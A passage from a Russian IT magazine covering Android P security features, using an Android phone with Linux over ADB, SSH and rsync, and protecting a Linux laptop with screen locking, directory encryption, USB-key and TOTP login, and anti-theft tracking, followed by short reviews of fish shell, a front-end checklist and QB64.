вные копии настроек приложений, авто матически отправляемых в Google Dri‐
ve. Это в том числе означает, что даже у Google не будет доступа к твоим дан‐
ным. Apple, кстати, всегда имела доступ к резервным копиям и отдавала их
властям по первому же запросу.


ДИАЛОГИ ПОДТВЕРЖДЕНИЯ С ЗАЩИТОЙ ОТ MITM
Еще одно интересное нововведение Android P — доступный сторонним раз‐
работчикам «защищен ный» диалог подтверждения  (ConﬁrmationDialog). Он
позволяет удостовериться, что пользователь действительно увидел текст
диалога и согласился с ним, даже в том случае, если смартфон пользователя
был взломан и малварь получила контроль над ядром и фреймворком.
   Если пользователь положительно отвечает на сообщение диалога, при‐
ложение получает криптогра фическую подпись, защищенную кодом аутен‐
тификации  сообщения  с  ключом‐хешем  (HMAC).  Подпись  создается
доверенной средой исполнения (TEE), которая защищает диалоговое окно
и ответ пользователя. Подпись озна чает, что поль зователь действительно
увидел сообщение и согласился с ним.


ЗАПРЕТ НА ИСПОЛЬЗОВАНИЕ СКРЫТЫХ API
В Android есть ряд скры тых, недос тупных обычным приложе ниям API. Мы уже
рассказывали о них и продемонстрировали, как получить доступ к этим API
с помощью рефлексии. Так же пос тупают и дру гие раз работчики при ложений,
а это приводит к уязвимостям и нестабильнос тям в работе приложений
(скрытые API могут меняться и исчезать от версии к версии).
  В Android P доступ к скрытым API запрещен. Более того, новая версия An‐
droid выводит уве домление в том случае, если приложе ние использует объ‐
явленные устаревшими (deprecated) API. Это должно заставить раз работ‐
чиков перейти на использование новых API.


КРИПТОГРАФИЧЕСКИЙ МОДУЛЬ STRONGBOX
Некоторые из устрой ств, осна щен ных Android  P, могут иметь встроенный
криптографический модуль StrongBox, работающий в коопе рации с модулем
TEE (Trusted Execution Environment, нап ример, TrustZone в процессорах Qual‐
comm). По сути, этот модуль — реализованный в железе Keymaster HAL
(Hardware Abstraction Layer), который в текущих версиях ОС представляет
собой библиотеку, реализованную произво дителем устройства или чипсета.





                   Как происхо дит работа с Keymaster


РЕАЛИЗАЦИЯ OMAPI API
Android P поддерживает GlobalPlatform Open Mobile API (OMAPI API), пред‐
назначенный для доступа к защищенным элементам (Secure Elements, SE),
специальным микрочипам, которые обычно устанавливаются в SIM‐карты,
банковские карты, карты оплаты проезда и смартфоны с поддержкой бес‐
контактных платежей.
   Secure Element — отдельный микропро цес сор с собственной памятью. Он
отвечает за безопасное хранение и выполнение платежных приложений.
В смартфонах с поддержкой NFC SecureElement обычно впаян в материнскую
плату, но также может находиться SIM‐карте или даже в карте памяти.


Одной стро кой
 • Начиная с Android P приложения больше не смо гут прочитать серийный
  номер устройства через переменную Build.SERIAL. Она всегда будет
   равна UNKNOWN. Для получения серийного номера теперь нужно пол‐
   номочие READ_PHONE_STATE.
 • Появилась  нативная поддержка  высокопроиз водительного  поточного
  шифра ChaCha20, который в том числе используется в браузере Chrome
   при соединении с сайтами Google, в ядре Linux для генерации слу чайных
   чисел и в некото рых системах потокового вещания.
 • Правила SELinux теперь запреща ют приложениям делиться данными
   с другими приложениями путем выставления откры тых прав доступа
   на файлы.
 • В следующих выпусках Android P планируется включить поддержку ран‐
   домизации MAC‐адресов при сканировании Wi‐Fi‐сетей. Это позволит
   бороться с отслеживанием пользователей (в iOS такая функция встроена
  еще с версии 8).
ТРЮКИ
ANDROID
ДЛЯ ЮНИКСОИДА




    ИСПОЛЬЗУЕМ
      СМАРТФОН
  В СВЯЗКЕ С LINUX





                 Евгений Зобнин
                Редактор Unixoid и Mobile
                       zobnin@glc.ru





Android и дис трибутивы Linux не просто родственные ОС —
они основаны на одном ядре и на низком уровне очень
похожи. В Android работает большинство команд Linux, сюда
можно установить bash, писать скрипты и даже запускать
серверы. Установив на смартфон SSH, ты можешь ходить
на него с компа и даже использовать rsync для синхрониза‐
ции файлов. Обо всем этом мы и поговорим сегодня.


ADB
Начнем с излюблен ного инс тру мента всех продвинутых пользовате лей An‐
droid — ADB. Мы уже много раз писали о нем, одна ко здесь просто обязаны
повториться. Итак, ADB расшифровывается как Android Debug Bridge, и по
сути это нечто вроде системы управления смартфоном с компа. ADB поз‐
воляет устанавливать и запус кать софт, перемещать файлы с устройства и на
устройство и выпол нять многие другие задачи.
   Чтобы настроить ADB в Windows, пришлось бы устанавливать драйверы
и перезагружать машину, в Linux он прос то работает. Достаточно активиро‐
вать ADB на смартфоне (Нас тройки → Для разработчиков → Отладка по USB)
и установить пакет с утилитой adb в систему:


// Ubuntu/Debian/Mint
$ sudo apt‐get install adb
// Arch Linux
$ sudo pacman ‐S android‐tools android‐udev

Далее необходимо подклю чить смартфон к компу и начать отдавать команды.
  Получение списка подключенных устройств:


$ adb devices

Установка на подклю ченное устройство APK:


$ adb install file.apk

Перемещение файла на устройство:


$ adb push файл /sdcard/

Скачивание файла с устройства:


$ adb pull /sdcard/DCIM/Camera/photo.jpg photo.jpg

Сделать скриншот и скачать его на комп:


$ adb shell screencap /sdcard/screenshot.png
$ adb pull /sdcard/screenshot.png
$ adb shell rm /sdcard/screenshot.png

Нажатие кнопки Power:


$ adb shell input keyevent 26

Ну и конечно же, ADB можно использовать для получения доступа к коман‐
дной строке смартфона:


$ adb shell

Важно отметить, что ADB может работать не только по USB, но и по Wi‐Fi,
однако для этого нужны пра ва root на устройстве и приложение WiFi ADB.
Запускаем приложение, включаем переключатель и подсоединяемся к смар‐
тфону с помощью adb connect и показанного при ложением IP‐адре са:


$ adb connect IP‐адрес


           WARNING

                   В   некоторых   дистрибутивах  ADB   может
                      не работать без прав root. Так происхо дит из‐за
                         отсутствия специальных правил Udev в дистри‐
                        бутиве.  Придется   либо   устанавливать   их
                         как отдельный пакет (android‐udev в Arch Lin‐
                             ux), либо настраивать Udev самостоятельно.



ADB-SYNC
ADB можно использовать и для синхрониза ции фай лов между устройствами
(для этого даже есть опция sync), однако удоб нее вос пользоваться скриптом
adb‐sync. Его достаточно скачать и запус тить. Например, так можно синхро‐
низировать музыку на устройстве и на ПК:


$ adb‐sync ~/Music/ /sdcard/Music

А так выполнить ту же синхрониза цию, но с удалением файлов, которые были
удалены на ПК:


$ adb‐sync ‐‐delete ~/Music/ /sdcard/Music

Простой способ скачать файлы на комп (обратная синхронизация):


$ adb‐sync ‐‐reverse /sdcard/Download/ ~/Downloads


ADBFS
Еще один интересный способ получить дос туп к фай лам на устройстве
с помощью ADB — использовать adbfs, псевдоФС, которая позволяет смон‐
тировать устройство так, будто это флеш ка или любой другой накопитель.
  Проще всего установить adbfs в Arch Linux. Здесь она есть в AUR, поэтому
достаточно выполнить одну команду:


$ yaourt ‐S adbfs‐rootless‐git

В Ubuntu и других системах adbfs придется собирать вручную:


$ sudo apt‐get install libfuse‐dev android‐tools‐adb
$ git clone git://github.com/spion/adbfs‐rootless.git
$ cd adbfs‐rootless
$ make

Ну а дальше можно подключать файловую систему:


$ mkdir ~/Android
$ adbfs ~/Android

Для отключения:


$ fusermount ‐u ~/Android


GO-MTPFS
Еще один вариант подключения устройства как файловой системы — go‐
mtpfs, файловая система, поз воляющая переда вать данные по протоколу
MTP. Именно этот протокол используется в смартфонах без карты памяти.
  В Arch Linux установить go‐mtpfs очень прос то:


$ yaourt ‐S go‐mtpfs

В других дистрибутивах несколько сложнее:


$ sudo apt‐get install golang‐go libusb1‐devel
$ mkdir /tmp/go
$ export GOPATH=/tmp/go
$ go get github.com/hanwen/go‐mtpfs
$ go install github.com/hanwen/go‐mtpfs

Дальше все так же элементарно, как с adbfs:


$ mkdir ~/Android
$ go‐mtpfs ~/Android

Для отключения:


$ fusermount ‐u ~/Android


SSH
Идея использовать ADB для общения с устройством может показаться стран‐
ной, если учитывать, что для Android существу ет сра зу несколько различных
SSH‐серверов, не требующих права root. Так оно и есть, во многих случаях
SSH будет удобнее и эффективнее. В качестве реализации сервера советую
выбрать SimpleSSHD, простую бесплат ную обертку для проверенного вре‐
менем SSH‐сервера DropBear для встраиваемых систем. Если у тебя есть
root, то рекомен дую также установить BusyBox On Rails, набор утилит коман‐
дной строки, наибо лее близкий к дистрибутивам Linux.
  Использовать SimpleSSHD очень просто. Запус каешь, нажимаешь START
и подключаешься к указанному IP‐адресу (порт 2222):


$ ssh 192.168.31.236 ‐p 2222

В момент подключения на экра не появится одноразовый пароль, который
следует указать в клиенте. Это не очень удоб ный способ аутентификации,
но ты можешь настроить аутентифика цию по клю чам. Просто переименуй
свой открытый ключ  (~/.ssh/id_rsa.pub) в authorized_keys и положи
в каталог ssh на карте памяти смартфона.





                           SimpleSSHD


BASH, TMUX, MC
SSH‐сервер на смартфоне сам по себе открывает широкие возможности,
но еще шире их можно сделать, если уста новить на смартфон классические
инструменты, такие как bash, tmux и mc. Пос ледний поз волит в том числе
с удобством ходить по карте памяти и приб рать ся в случае необходимости.
  О том, как установить на смартфон bash, tmux, mc и nano, я уже расска‐
зывал в статье про сервер на базе смартфона, но поз волю себе повториться.
И сразу пре дупрежу, что тебе пот ребуются права root на смартфоне.
   Итак, скачиваем Terminal IDE, переименовываем пакет APK в ZIP, рас‐
паковываем, находим файл assets/system‐2.0.tar.gz.mp3, пере именовы‐
ваем, убирая расширение mp3, и распаковываем. Внутри будет множество
каталогов и файлов, из которых нас интересу ют толь ко system/bin и system/
etc/terminfo. Первый содержит нуж ные нам утилиты; скопируй те, что тебе
пригодятся, в отдельный каталог. Второй необходим для корректного функци‐
онирования утилит.
  Выбранные утилиты и каталог terminfo скинь на карту памяти смартфона.
Затем подключись к нему по SSH и введи следующие команды, чтобы
получить возможность модификации системного каталога:


$ su
# mount ‐o remount,rw /system

Далее скопируй все нужные утилиты в /system/xbin/ и установи на них бит
исполнения (на примере bash):


# cp bash /system/xbin/
# chmod 755 /system/xbin/bash

Затем создай файл /sdcard/ssh/.bashrc, помес ти в него следующие стро‐
ки:


export TERMINFO=/sdcard/terminfo
export TMPDIR=/data/local/tmp
export PS1="\u@\h:\w \$ "

Открой настройки SimpleSSHD на смартфоне и в опции Login Shell укажи /
system/xbin/bash, оста нови и вновь запус ти сервер. При следующем входе
по SSH откроется bash и будут дос тупны ско пированные тобой утилиты.
   Чтобы добиться корректной работы Vim и mc, скопируй на карту памяти
также каталоги etc/mc и etc/vim, а в файл /sdcard/ssh/.bashrc добавь
строки:


export MC_DATADIR=/sdcard/mc
export VIMRUNTIME=/sdcard/vim





                 Midnight commander, запущенный в Android


RSYNC
SSH‐сервер дает нам возможность использовать rsync, мощную ути литу
для синхронизации и бэкапа файлов. Rsync поз воляет осуществлять быструю
двунаправленную синхрониза цию файлов между  двумя машинами  (или
машиной и смартфоном, как в нашем случае) с выкачи ванием только новых
и измененных файлов и возможностью возобновления прерванной синхро‐
низации.
  Простейший пример использования rsync в связке со смартфоном:


$ rsync ‐‐update ‐‐progress ‐e 'ssh ‐p 2222' ‐azv 192.168.31.236:/
sdcard/DCIM/Camera ~/Photos

Эта команда скопирует все фотографии со смартфона в каталог ~/Photos,
пропустив те, что уже есть в каталоге. Связка опций ‐azv в данном случае
означает, что каталог необходимо передать как есть со всеми его под катало‐
гами и правами доступа (флаг ‐a) плюс использовать сжатие (флаг ‐z).
  Обратная команда — копирование данных с машины на смартфон:


$ rsync ‐‐delete ‐‐progress ‐e 'ssh ‐p 2222' ‐azv ~/Books 192.168.31.
236:/sdcard/Books

Здесь мы использовали флаг ‐‐delete, что бы уда лить фай лы, которые были
удалены из локального катало га ~/Books.
  По умолчанию при обрыве соеди нения rsync будет удалять частично
переданные файлы. Что бы это го избежать, можно использовать флаг ‐‐par‐
tial, который заставит rsync сохранять недокачанные файлы и возобновить
их загрузку при сле дующем запуске команды.


SSHBUTTON
Ок, к смартфону мы подключились, файлы синхронизировали, но что, если
нам нужно обратное SSH‐подключение от смартфона к компу? В этом случае
подойдет любой из десят ков SSH‐клиентов для Android (тот же ConnectBot,
например), если, конечно, ты готов вводить команды на сенсорной клавиату‐
ре маленького экрана.
   Если не готов, твой выбор — приложение SSH button, позволяющее запус‐
кать нужную команду на нужной машине по нажатию кнопки. Интерфейс у SSH
button страшный, но приложение отлично работа ет. Просто запус ти SSH but‐
ton, далее Меню → Add... и введи нужную команду, адрес SSH‐сервера, логин
и пароль.
  SSH button удоб но использовать для выключения или усыпления компа
(команды systemctl suspend и halt), запуска и остановки торрентов, кон‐
тролирования музыки (например, плеер mocp, о котором я рассказывал
в одной из прошлых ста тей, позволяет управлять собой через командную
строку).





                        SSH button


ВЫВОДЫ
Использовать Android в связ ке с Linux действительно удобно. В отличие
от Windows здесь не нужны дополнительные драйверы, спе циальные серверы
и прочие странные вещи. В большинс тве случаев можно обойтись стандар‐
тными для мира Linux SSH и rsync, но в Сети всегда можно найти более инте‐
ресные инструмен ты.
ТРЮКИ

ЗАЩИЩАЕМ
НОУТБУК
  LINUXС





                        ШИФРОВАНИЕ,
                       АУТЕНТИФИКАЦИЯ
                 ПО ФЛЕШКЕ И ВОЗВРАТ
                          УКРАДЕННОГО





Уверен, многие читатели ][ уже дав но изба‐
вились от стационарных компов и исполь‐
зуют  ноутбук  как  основной  инструмент
для работы, учебы и всего остального. Мир
сдвинулся  с места и  стал мобильным.          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
Но там, где есть мобильная тех ника, есть              zobnin@glc.ru
и риск ее потерять, забыть или быть обок‐
раденным. Как при этом не лишиться дан‐
ных, уберечь их от посторонних глаз и отыс‐
кать‐таки украденную технику? Попробуем
разобраться.


ФИЗИЧЕСКИЙ ДОСТУП
Начнем, как обычно, с азов, а именно с пароля на вход. Казалось бы, здесь
все просто: любая графичес кая среда имеет встро енный блокировщик экра‐
на, который тре бует ввести пароль после нес коль ких минут простоя машины.
Но что делать, если ты не используешь графичес кую среду и твой выбор —
легковесный оконный менеджер вроде Fluxbox или i3?
  Существует масса самых раз нообразных блокировщиков экрана, но я бы
рекомендовал остановиться на slock. Это крайне прос той блокировщик,
не имеющий  никаких  графичес ких  элементов  управления,  окон  ввода
и переключателей сессий. Все, что он делает, — это заливает экран черным
цветом. При вводе пароля экран становится синим, а при нажатии Enter в слу‐
чае неправильного пароля — крас ным. Увидев такое, большинс тво «взлом‐
щиков» впадут в ступор и решат, что комп прос то завис.
  Запускать slock можно как напрямую (тогда экран заблокируется сразу),
так и автоматически пос ле про буж дения ноут бука. Во втором слу чае тебе
понадобится systemd‐юнит следующего содержания:


[Unit]
Description=Lock X session using slock for user %i
Before=sleep.target
[Service]
User=%i
Environment=DISPLAY=:0
ExecStartPre=/usr/bin/xset dpms force suspend
ExecStart=/usr/bin/slock
[Install]
WantedBy=sleep.target

Сохрани его в файл /etc/systemd/system/slock@.service и активируй
юнит (USER — твое имя в системе):


$ sudo systemctl enable slock@USER.service

Еще одна крайне простая, но оттого не менее ценная рекомендация — пос‐
тавь пароль на BIOS и отключи заг рузку с любых носителей, кроме жесткого
диска. Это убережет тебя от тех, кто попытается заг рузиться с флешки, чтобы
прочитать твой диск из дру гой операционной сис темы.
  Многие ноутбуки также поз воляют уста новить пароль на загрузку, перезаг‐
рузку и доступ к жесткому диску. Пос ледний работа ет на уровне ATA‐контрол‐
лера, он спасет, если кто‐то все‐таки сможет загрузить свою операционку,
но будет бесполезен про тив физичес кого извлечения жесткого дис ка.


ШИФРОВАНИЕ ДИСКА
Почти все популярные дистрибутивы поз воляют зашифровать жесткий диск
на этапе установ ки операционной системы. Такое шифрование делает извле‐
чение данных с диска почти невозможной задачей (при достаточно длинном
пароле), но имеет один существенный недос таток: падение производитель‐
ности операций ввода‐вывода, которое может достигать сотен и тысяч про‐
центов.
  Минимизировать проседа ние производительности можно, если зашиф‐
ровать только раздел /home (на котором и находят ся твои данные), а саму
систему оставить незашифрованной. По факту многие дистрибути вы пред‐
лагают такой вариант по умолчанию, но он тоже не иде ален: ноутбук будет
жрать дополнительные ресурсы просто при прос мотре сохраненного на диск
фильма, а если ты занимаешь ся раз работкой ПО или прос то час то собира‐
ешь софт из исходников — готовься к сущес твенному замедлению.
  Но и из этой ситуации есть выход. Сис темы EncFS и CryFS используют
механизм FUSE, чтобы создать зашифрованную виртуальную ФС поверх
основной. С их помощью ты можешь зашифровать любой отдельно взятый
каталог, без необходимости выделять специаль ный контейнер заранее опре‐
деленного размера и с воз можностью син хрониза ции каталога с Dropbox
и другими подобными сервисами.
  Обе файловые системы используют алгоритм AES‐256 в режиме GCM,
но отличаются в реализации. EncFS шифрует каждый файл по отдельности
и поэтому скрывает лишь содержимое фай лов и их названия, но никак не пре‐
пятствует получению информа ции о структуре каталогов и размере файлов.
Другими словами: если кому‐то потребуется доказать, что ты хранишь архив
детского порно, скачанный из даркнета, — он сможет это сделать.
   CryFS защищает от подобных рисков. Зашифрованный с ее помощью
каталог выглядит как плоское файловое дерево с кучей каталогов и файлов
одинакового размера. Одна ко CryFS никогда не подвергалась независимому
аудиту, который был произведен в отношении EncFS. Если тебя это останав‐
ливает — используй EncFS, если же ты не веришь ни тому, ни дру гому —
можешь вооружиться VeraCrypt или другим «классическим» инструментом
шифрования, использующим контейнер заранее заданного размера, который
нельзя выложить в Dropbox без синхрониза ции всех зашифрованных данных
при малейшем изменении.
  Использовать EncFS и CryFS крайне прос то. Достаточно установить пакет,
а затем выполнить операцию монтирования:


$ cryfs ~/Dropbox/box ~/crypto

В данном случае мы подключаем зашифрованный каталог ~/Dropbox/box
как ~/crypto. Все файлы, записанные в последний, появятся в первом
в зашифрованном виде.
  В этот каталог можно сложить все ценные данные: сканы пас порта, ключи
GPG, рабочие катало ги криптокошельков, базы паролей и так далее. Подклю‐
чать его придется вручную после каждой заг рузки, а после использования
лучше сразу отключать:


$ fusermount ‐u ~/crypto





       Содер жимое катало га, зашифрованного с помощью CryFS


АУТЕНТИФИКАЦИЯ БЕЗ ПАРОЛЯ
Итак, диск защищен, пароль уста новлен, но удоб но ли это? Ввес ти пароль
при загрузке, которая в современных ноут буках происходит не так уж и часто,
нетрудно, ввести пароль для рас шифровки данных при загрузке тоже, но вво‐
дить его каждый раз при разбло кировке экра на не особо инте ресно. Тем
более пароль могут подсмотреть твои соседи в самоле те. Нужен другой
метод, а еще лучше комбинация методов.


Флеш ка
Думаю, все слышали про штуку под названием YubiKey. Это USB‐ключ, выс‐
тупающий в роли вто рого фактора при аутентифика ции на сайтах и в системе.
Стоит такой ключ 50 долларов, но на самом деле вместо него можно исполь‐
зовать обычную флешку.
  Модуль pam_usb позволя ет настро ить аутентификацию с помощью любой
USB‐флешки. Прин цип  работы  здесь  следующий:  утилита  записывает
на флешку 2 Кбайт случайных данных, которые выступают в роли уникального
клю ча. Во время аутентификации pam_usb прочитает блок данных с флешки,
сравнит их с сох раненными в компе и пустит тебя в систему, если они сов‐
падают.
   Чтобы все это зарабо тало, необ ходимо выполнить сле дующие шаги. Уста‐
новить pam_usb:


$ git clone https://github.com/aluzzardi/pam_usb.git
$ cd pam_usb
$ make
$ sudo make install

В Arch Linux pam_usb доступен в AUR:


$ yaourt ‐S pam_usb

Добавить те самые случайные данные на флешку (здесь AuthKey — про‐
извольное имя):


$ sudo pamusb‐conf ‐‐add‐device AuthKey

Указать пользователя, который будет проходить аутентификацию с помощью
флешки:


$ sudo pamusb‐conf ‐‐add‐user username

Проверить, что все настро ено так, как надо:


$ sudo pamusb‐check username

Наконец, добавить pam_usb в список PAM‐модулей. Для этого откры ваем
файл /etc/pam.d/common‐auth (или /etc/pam.d/system‐auth в Arch Linux
и Fedora) и добавляем в начало файла такую строку:


auth sufficient pam_usb.so

В этом случае флешки будет достаточно для аутентификации. Если же ты
хочешь получить двухфакторную аутентификацию, когда требуется и флешка,
и пароль, измени строч ку на такую:


auth required pam_usb.so

Имей в виду, что автор pam_usb не позициони рует свою раз работку как неч‐
то, чему можно доверить защиту государственной тай ны и уж тем более
семейного рецепта лукового супа. С флеш ки можно снять дамп, записать его
на другую флешку и использовать ее для аутентифика ции.





                      Нас тра иваем pam_usb


Смартфон
Вместо флешки (или в дополнение к ней) мож но взять смартфон. Уве рен, что
хотя бы раз в жизни ты пользовался приложением Google Authenticator. Оно
реализует алгоритм TOTP (Time‐based One‐Time Password, RFC 6238), поз‐
воляющий выполнять аутентифика цию в одном приложении с помощью одно‐
разового пароля, сгенерированного другим приложением (о том, как это
работает, хорошо написа но здесь).
   Google позволяет прис пособить Authenticator в том числе для аутен‐
тификации в своих сервисах. Однако в реальности оно никак не завязано
на Google и не исполь зует его серверы (передача клю ча, нужного для генера‐
ции одноразовых паролей, про исходит нап рямую, с помощью QR‐кода, после
чего приложение действу ет независимо), что поз воляет нам пользоваться им
для аутентификации в сис теме без страха утечек паролей.
  Для этого необ ходимо установить PAM‐модуль pam‐google‐authenticator:


$ ./bootstrap.sh
$ ./configure
$ make
$ sudo make install

В Arch Linux установка делается так:


$ yaourt ‐S google‐authenticator‐libpam‐git

Далее запускаем приложение google‐authenticator:


$ google‐authenticator

Оно сгенерирует QR‐код (или покажет ссылку на него), который необходимо
отсканировать с помощью приложения Google Authenticator на смартфоне,
а также задаст несколь ко вопросов. На все вопросы, кроме четвертого (уве‐
личение вре мен ного расхождения между клиентом и сервером), отвечай
отрицательно.
  Далее, как и в случае с флешкой, добавляем в /etc/pam.d/common‐auth
следующую строку:


auth required pam_google_authenticator.so no_increment_hotp

Одноразовые пароли можно без проб лем комбинировать с необходимостью
вставить флешку в разных вариациях. Для этого просто выс тави вторую
опцию в нужное значение.





                  QR‐код pam‐google‐authenticator


ПРОТИВОУГОНКА
С помощью паролей, одноразовых кодов и шифрования мы можем защитить
лишь информацию на ноутбуке. Что бы защитить сам ноутбук, нужны совсем
другие средства, а именно некая система отслеживания, подобная функции
Find my iPhone. То есть система, которая поз волила бы нам удаленно свя зать‐
ся с ноутбуком, определить его координаты, сделать снимок экрана и снимок
фронтальной камерой.
  Одно из лучших решений в этой сфере называется Prey. Он доступен
для телефонов и компов на базе Windows, macOS и Linux. Нас интересу ет
последний вариант, поэто му идем на страницу загрузок, качаем deb‐пакет
и устанавливаем его:


$ sudo dpkg ‐i prey_1.7.3_amd64.deb

В Arch Linux Prey есть в AUR:


$ yaourt ‐S prey‐node‐client

Только следует иметь в виду, что уста новится в систему он под именем
prey_project.
   Когда установка будет завершена, запус каем конфигуратор:


$ sudo prey config account setup

Он спросит тебя о email‐адресе, попросит ввести пароль, и на этом установ‐
ка  будет  завершена.  Что бы про верить,  что  все работает, переходим
в  веб‐панель  управления  и  нас лаждаемся  воз можностью  отслеживать
устройство в режиме реального времени.
  Бесплатная версия Prey позволяет узнать местоположение устройства,
информацию об ОС и железе, вклю чить сигнализацию, заблокировать
устройство, сде лать снимки камерой или скриншоты. Чтобы получить воз‐
можность удалять данные и скачивать файлы, придется платить пять дол ларов
в месяц.
   Также имей в виду, что в отличие от смартфонов, которые по дефол ту
всегда подключены к мобильной сети и таким образом всегда доступны
онлайн, ноутбук чаще находится в офлайне и обычно подключается к откры‐
тым Wi‐Fi‐сетям толь ко после разрешения пользователя. Другими словами,
шансы найти ноутбук куда мень ше, чем шансы найти телефон.





             Ин фа о ноутбуке в панели управления Prey


ФОТКА ПРИ ВЫХОДЕ ИЗ СНА
Еще один метод борьбы с непрошеными гос тями — фоткать их. Допустим, ты
оставил ноутбук в номере, заходит нез накомый человек, пробуждает ноутбук
ото сна и пытается залогиниться (точнее, пытается понять, что происходит,
ведь мы используем slock). Самое время его сфотографировать.
  Для начала напишем скрипт, который будет делать фотку с помощью
камеры ноутбука. Он будет крайне простым:


#!/bin/sh
ffmpeg ‐y ‐t 1 ‐f video4linux2 ‐s 640x480 ‐r 30 ‐i /dev/video0 ‐f
image2 $HOME/webcam.png

Назови его take_photo, положи в каталог ~/bin и дай права на исполнение:


$ chmod +x ~/bin/take_photo

Теперь нам надо написать скрипт, который будет запускать наш скрипт после
пробуждения компа. Вот он:


#!/bin/sh
if [ $1 = post ] && [ $2 = suspend ]; then
    sudo ‐u ТВОЕ_ИМЯ_В_СИСТЕМЕ /home/ТВОЕ_ИМЯ_В_СИСТЕМЕ/bin/take_p
hoto
fi

Назови его 00take_photo, положи в каталог /lib/systemd/system‐sleep/
и точно так же дай права на исполнение:


$ chmod +x /lib/systemd/system‐sleep/00take_photo

Теперь при каждом пробуждении ноут бук будет делать фото и сохранять его
в файл ~/webcam.png. Но мы можем пойти еще дальше и отправить фото
себе в телеграм. Для это го уста навливаем telegram‐cli. Проще всего это сде‐
лать в Arch Linux:


$ yaourt ‐S telegram‐cli‐git

Запускаем утилиту командой telegram‐cli, она зап росит номер телефона
(phone number:) в формате +71234567890, а затем код безопасности из СМС
и пароль, если он исполь зуется.
  Затем немного поправим наш скрипт ~/bin/take_photo:


#!/bin/bash
ffmpeg ‐y ‐t 1 ‐f video4linux2 ‐s 640x480 ‐r 30 ‐i /dev/video0 ‐f
image2 $HOME/webcam‐`date`.png
sleep 60
telegram‐cli ‐W ‐D ‐e "send_photo @ТВОЕ_ИМЯ_В_ТЕЛЕГРАМЕ $HOME/webcam.
png `date`"

Теперь он не только будет делать фото, но и отправит его в наш телеграм.
Команда sleep 60 нужна для минут ной задержки перед отправкой, чтобы
ноутбук успел подключиться к Wi‐Fi.


ВЫВОДЫ
Защитить ноутбук не так прос то, как смартфоны, которые используют пол‐
нодисковое шифрование с ускорением с помощью TEE‐модуля, защиту
по отпечатку пальца и имеют возможность отслеживания по всем типам
сетей. Но, применив нехитрые приемы, описанные в статье, ты хотя бы смо‐
жешь сказать, что сделал все воз можное.
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



       FISH SHELL — ЗАМЕНА ДЛЯ BASH С УПОРОМ НА КОМФОРТ
      И ЮЗАБИЛИТИ
       Все давно свыклись с тем, что командная строка не менялась1        с семидесятых‐вось мидесятых годов, и понимают, что лучше уже
        вряд ли станет. Однако попыт ки изменить ситуацию всё же нет‐нет
        да предпринимаются. Раз работчик шел ла под наз ванием ﬁsh решил
         вытянуть UX командной строки хотя бы еще на десять лет в будущее.
       Слоган на главной стра нице про екта иронично гласит: «Наконец‐то
        шелл, достойный девяностых годов!»





                                Сайт ﬁsh

       Среди основных дос тоинств ﬁsh перечисляются: цве та VGA, авто‐
        дополнение, удоб ные нас тройки «из короб ки», вменяемая система
        скриптования, подсказки для парамет ров команд и настройка
        из браузера.
         При работе самое заметное отличие от bash — это, конечно,
        автодопол нение: дополняются как пути, так и названия команд
        и даже параметры к ним. Например, если написать ls ‐ и нажать
         Tab, то ﬁsh покажет полный список параметров с пояснениями,
        вытянутыми из стра ницы man.





       При этом ﬁsh непрерывно ищет по истории и предлагает уже вво‐
        дившиеся команды в качестве подсказок, а также на лету проверя ет
        синтаксис.
          Возможно, ты успел немного удивиться, когда прочитал про нас‐
        тройки через бра узер. Это решение дей стви тельно выглядит нем‐
        ного необычным для мира Unix, но тем не менее если ты напишешь
        fish_config, то на порте 8000 поднимет ся веб‐сервер с настрой‐
        ками и откроется окно браузера.





      В общем, даже если ты уже настроил себе zsh со все ми удобствами,
        все равно есть смысл посмотреть на ﬁsh поближе. Не забудь заг‐
         лянуть в документацию, а если пойдешь дальше и начнешь писать
        скрипты на ﬁsh, то посмотри еще вот этот cookbook.


      FRONT-END CHECKLIST — СПИСОК ВСЕГО, ЧТО НУЖНО
      СДЕЛАТЬ ПЕРЕД ЗАПУСКОМ САЙТА
        Если попытаться записать всё, что нуж но добавить, подключить2        и проконтролиро вать перед тем, как откры вать сайт, то выйдет вну‐
        шительный список. Именно его сос тавлением и занялся куратор
        документа под наз вани ем Front‐End Checklist и опубликовал свою
        подборку на Github во имя всеобщего бла га.





       Список поделен на разделы: всё, что идет в тег Head (теги meta,
       фавайкон и им подоб ные), лучшие практики HTML, настройка шриф‐
          тов, CSS, оптимизация картинок, JavaScript, безопасность, тес‐
        тирование производительнос ти, доступность и SEO.
          Большинство пунктов снабжено ссылками на полез ные ресурсы
        и ярлычком по степени приоритета (low, medium, high), чтобы было
        понятно, за что браться в первую очередь. Список переведен
        на мно гие языки, вклю чая русский (спасибо Михаилу Истомину!).
        И заодно порекомендую другую ссылку на тему веб‐дизайна. 30
        Seconds of CSS — это сайт с подборкой полезных трюков, которые
       можно сделать при помощи CSS. Каждый — с работающим при‐
       мером и необ ходимыми подробностями.


      QB64 — НАСЛЕДНИК QUICKBASIC, КОТОРЫЙ ПОЧТИ НЕ
      ВЫГЛЯДИТ УСТАРЕВШИМ
        Если ты успел провес ти достаточно времени за синим экраном,3        на котором заглавными буквами возводились зиккураты из циклов
        FOR..NEXT, значит, тебе будет приятно (или как минимум забавно)
        услышать о том, что легендарный QuickBASIC жив по сей день.
         Последняя,  седьмая вер сия  настоящего  QuickBASIC вышла
        в 1990 году. Через год Microsoft помашет ему ручкой и зарелизит
         куда менее дружелюбный Visual Basic, который со вре менем прев‐
         ратится в VB.Net, ушедший от своих корней совсем уж далеко. QBa‐
           sic — урезанная версия QuickBASIC без компилятора — прилага‐
        лась к MS‐DOS еще какое‐то время, но где теперь тот MS‐DOS?





      В 2007 году брошенный «Микрософтом» флаг подобрали энтузиас‐
        ты и создали QB64. В этом проекте реализовано всё, о чем мы
        не могли и помыслить в девянос тые годы. Поддержка любых раз‐
       решений экрана, биб лиотеки для работы с картинками в PNG
        и музыкой в MP3, векторные шрифты со сглаживанием, трехмерная
        графика, поддержка сети… И, что немаловажно, возможность рас‐
         тянуть окно с редактором при работе в графическом режиме.
         При этом QB64 не утерял обратной совместимости со своим
        предком и спокойно компилирует  старые программы:  тех же
         «Горилл», змейку и любой старый код, который ты успел спасти
        с трехдюймовых дискет. Я не забыл сказать, что, помимо Windows,
       QB64 работает в Linux и macOS? Нужен только небольшой фикс
        для инсталлятора.





          Так я и знал: поддержку OpenGL в бей сик добави ли какие‐то
          сектоиды

      И если старина QuickBASIC про изво дил программы, которые еле
        работали на тогдашних «трешках» и «четверках», то QB64 благодаря
